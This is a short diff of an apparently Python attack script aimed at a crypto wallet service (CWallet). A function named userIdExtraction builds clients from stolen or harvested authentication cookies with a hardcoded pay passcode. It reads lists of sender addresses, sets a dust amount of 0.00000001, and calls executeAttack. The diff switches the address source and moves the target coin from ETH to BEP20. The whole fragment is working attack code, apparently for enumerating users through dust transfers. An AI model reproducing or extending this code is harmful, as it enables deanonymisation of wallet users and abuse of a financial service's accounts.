@@ -139,10 +139,10 @@ async def userIdExtraction():
         clients.append(CWalletClient(authCookie=cookie, payPassCode="111111"))
 
     # Getting Addresses
-    addressesFileName = "unique_senders_alchemy.txt"
+    addressesFileName = "unique_senders_covalent_async.txt"
     resultsFileName = "results_eth.txt"
     amount = "0.00000001"
-    cryptoCoin = COINS["ETH"]
+    cryptoCoin = COINS["BEP20"]
 
     await executeAttack(
         addressesFileName=addressesFileName,
